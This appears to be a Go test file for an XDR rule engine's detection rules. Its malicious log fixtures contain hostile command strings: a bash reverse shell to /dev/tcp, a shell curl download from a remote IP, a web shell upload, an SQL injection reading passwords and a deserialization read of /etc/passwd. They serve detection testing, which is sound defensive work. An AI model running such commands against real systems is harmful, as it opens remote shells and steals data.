package rules

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/lyflow/ly-flow-platform/server/xdr/models"
)

func TestLoadRulesIncludesLyFlowBaselinePack(t *testing.T) {
	loader := NewRuleLoader(filepath.Join("..", "..", "..", "rules", "xdr"))
	rules, err := loader.LoadRules()
	if err != nil {
		t.Fatalf("load baseline rules: %v", err)
	}

	wantIDs := map[int]string{
		81001: "login anomaly",
		81002: "suspicious upload",
		81003: "admin access",
		81004: "runtime process",
		81005: "rasp sqli",
		81006: "rasp command injection",
		81007: "rasp file/deserialization",
		81008: "multi-stage attack chain",
	}
	for _, rule := range rules {
		delete(wantIDs, rule.ID)
	}
	if len(wantIDs) > 0 {
		t.Fatalf("missing LyFlow baseline rule IDs: %#v", wantIDs)
	}
}

func TestLoadRulesWalksNestedYamlPacks(t *testing.T) {
	dir := t.TempDir()
	nested := filepath.Join(dir, "nested")
	if err := os.Mkdir(nested, 0o755); err != nil {
		t.Fatalf("mkdir nested rules dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(nested, "pack.yaml"), []byte(`rules:
  - id: 99001
    name: Nested Test Rule
    level: 7
    source: runtime
    match: nested-test
    enabled: true
`), 0o644); err != nil {
		t.Fatalf("write nested rule pack: %v", err)
	}

	rules, err := NewRuleLoader(dir).LoadRules()
	if err != nil {
		t.Fatalf("load nested rules: %v", err)
	}
	if len(rules) != 1 || rules[0].ID != 99001 {
		t.Fatalf("expected nested rule 99001, got %#v", rules)
	}
}

func TestLyFlowBaselineMaliciousFixturesMatch(t *testing.T) {
	engine := loadBaselineEngine(t)
	fixtures := []*models.NormalizedLog{
		{Source: "sshd", Program: "sshd", Message: "Failed password for invalid user admin from 203.0.113.10 port 55123 ssh2", SrcIP: "203.0.113.10"},
		{Source: "dpi", Message: "POST /upload multipart/form-data filename=shell.php", SrcIP: "203.0.113.11", DstIP: "10.0.0.5"},
		{Source: "dpi", Message: "GET /admin/login HTTP/1.1", SrcIP: "203.0.113.12", DstIP: "10.0.0.5"},
		{Source: "runtime", Message: "suspicious_process process_start bash -i >& /dev/tcp/203.0.113.13/4444", SrcIP: "203.0.113.13"},
		{Source: "rasp", Message: "RASP blocked SQL injection union select password from users", SrcIP: "203.0.113.14"},
		{Source: "rasp", Message: "RASP command injection ProcessBuilder /bin/sh -c curl http://203.0.113.15/p", SrcIP: "203.0.113.15"},
		{Source: "rasp", Message: "RASP unsafe deserialization readObject ysoserial sensitive file /etc/passwd", SrcIP: "203.0.113.16"},
		{Source: "xdr", Message: "attack_chain chain_id=chain-001 initial_access execution impact", Metadata: map[string]interface{}{"chain_id": "chain-001"}},
	}

	matchedRules := make(map[int]bool)
	for _, fixture := range fixtures {
		for _, result := range engine.Match(fixture) {
			if result.Rule.ID >= 81001 && result.Rule.ID <= 81008 {
				matchedRules[result.Rule.ID] = true
			}
		}
	}

	for id := 81001; id <= 81008; id++ {
		if !matchedRules[id] {
			t.Fatalf("baseline rule %d did not match malicious fixtures; matched=%#v", id, matchedRules)
		}
	}
}

func TestLyFlowBaselineBenignHealthCheckDoesNotHighAlert(t *testing.T) {
	engine := loadBaselineEngine(t)
	results := engine.Match(&models.NormalizedLog{
		Source:  "dpi",
		Message: "GET /health HTTP/1.1 200 ok",
		SrcIP:   "127.0.0.1",
		DstIP:   "127.0.0.1",
	})
	for _, result := range results {
		if result.Rule.ID >= 81001 && result.Rule.ID <= 81008 {
			if severity := result.Rule.GetSeverity(); severity == models.SeverityHigh || severity == models.SeverityCritical {
				t.Fatalf("benign health check matched high baseline rule %d", result.Rule.ID)
			}
		}
	}
}

func TestLyFlowBaselineEvidenceShape(t *testing.T) {
	engine := loadBaselineEngine(t)
	results := engine.Match(&models.NormalizedLog{
		AgentID:  "agent-evidence",
		Hostname: "lyflow-host",
		Source:   "xdr",
		Message:  "attack_chain chain_id=chain-001 initial_access execution impact",
		Metadata: map[string]interface{}{"chain_id": "chain-001"},
	})

	var chainResult *models.MatchResult
	for _, result := range results {
		if result.Rule.ID == 81008 {
			chainResult = result
			break
		}
	}
	if chainResult == nil {
		t.Fatal("expected attack-chain fixture to match rule 81008")
	}

	evidence := map[string]interface{}{
		"rule_id":   chainResult.Rule.ID,
		"rule_name": chainResult.Rule.Name,
		"severity":  chainResult.Rule.GetSeverity(),
		"chain_id":  chainResult.Log.Metadata["chain_id"],
		"tags":      chainResult.Rule.GetTags(),
	}
	encoded, err := json.Marshal(evidence)
	if err != nil {
		t.Fatalf("marshal evidence shape: %v", err)
	}
	if !strings.Contains(string(encoded), "chain-001") || !strings.Contains(string(encoded), "81008") {
		t.Fatalf("evidence missing rule_id/chain_id: %s", encoded)
	}
}

func loadBaselineEngine(t *testing.T) *RuleEngine {
	t.Helper()
	rules, err := NewRuleLoader(filepath.Join("..", "..", "..", "rules", "xdr")).LoadRules()
	if err != nil {
		t.Fatalf("load rules: %v", err)
	}
	engine := NewRuleEngine()
	engine.LoadRules(rules)
	return engine
}
